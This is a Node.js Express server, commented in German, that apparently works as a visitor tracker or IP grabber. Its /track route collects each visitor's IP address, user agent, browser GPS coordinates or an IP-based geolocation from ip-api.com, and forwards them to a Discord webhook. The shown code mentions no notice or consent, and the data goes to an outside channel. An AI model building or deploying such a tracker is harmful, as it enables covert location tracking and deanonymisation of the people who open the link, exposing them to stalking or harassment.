const express = require('express');
const axios = require('axios');
const path = require('path');

const app = express();

// ⚠️ In Render unter "Environment Variables" setzen:
const DISCORD_WEBHOOK_URL = process.env.DISCORD_WEBHOOK_URL;

app.use(express.json());

// Startseite / index.html ausliefern
app.get('/', (req, res) => {
  res.sendFile(path.join(__dirname, 'index.html'));
});

// 📡 /track – Quelle kennzeichnen (GPS vs. IP) + optional Accuracy anzeigen
app.get('/track', async (req, res) => {
  // IP robust ermitteln (x-forwarded-for kann Komma-Liste sein)
  const rawIp = (req.headers['x-forwarded-for'] || req.socket.remoteAddress || '').toString();
  const ip = rawIp.split(',')[0].trim() || '—';
  const userAgent = req.headers['user-agent'] || 'unknown';
  const timestamp = new Date().toISOString();

  let source = 'ip';       // 'gps' wenn Browser Koordinaten liefert
  let location = {};
  let accuracy;            // Meter

  if (req.query.lat && req.query.lon) {
    source = 'gps';
    location = {
      latitude: String(req.query.lat),
      longitude: String(req.query.lon),
    };
    if (req.query.acc) accuracy = String(req.query.acc);
  } else {
    // Optionaler Fallback: IP-Geolocation (nur grob, kann bei ::1/127.0.0.1 nichts liefern)
    try {
      if (ip && ip !== '::1' && ip !== '127.0.0.1') {
        const r = await axios.get(`http://ip-api.com/json/${ip}`);
        if (r?.data?.status === 'success') {
          location = {
            city: r.data.city || '—',
            region: r.data.regionName || '—',
            country: r.data.country || '—',
            latitude: r.data.lat ?? '—',
            longitude: r.data.lon ?? '—',
          };
        }
      }
    } catch (e) {
      console.error('🌐 IP-Geolocation-Fehler:', e.message);
    }
  }

  // Konsolen-Log zur Kontrolle
  console.log({ source, ip, userAgent, timestamp, location, query: req.query || {} });

  // Discord-Embed zusammenbauen
  const fields = [
    { name: 'Quelle', value: source === 'gps' ? '📍 GPS (genau)' : '🌐 IP-Schätzung (grob)', inline: false },
    { name: 'IP', value: ip === '::1' ? '::1 (localhost)' : String(ip), inline: false },
    { name: 'User-Agent', value: userAgent.slice(0, 1000), inline: false },
    { name: 'Zeit', value: timestamp, inline: false },
  ];
  if (source === 'gps') {
    fields.push({ name: 'Standort (lat/lon)', value: '```json\n' + JSON.stringify(location, null, 2) + '\n```', inline: false });
    if (accuracy) fields.push({ name: 'Genauigkeit', value: `${accuracy} m`, inline: true });
  } else if (Object.keys(location).length) {
    fields.push({ name: 'IP-Standort (grobe Schätzung)', value: '```json\n' + JSON.stringify(location, null, 2) + '\n```', inline: false });
  }

  try {
    await axios.post(DISCORD_WEBHOOK_URL, {
      embeds: [
        {
          title: '📡 Neuer Track-Request',
          color: source === 'gps' ? 0x2ecc71 : 0xf1c40f, // grün = GPS, gelb = IP
          fields,
          footer: { text: 'Express Tracker' },
          timestamp
        }
      ]
    });
    res.send('OK');
  } catch (err) {
    console.error('❌ Fehler beim Senden an Discord:', err.message);
    res.status(500).send('Failed to send to Discord');
  }
});

// 🚀 Server starten (Render-kompatibel)
const port = process.env.PORT || 3000;
app.listen(port, '0.0.0.0', () => console.log(`✅ Server on ${port}`));



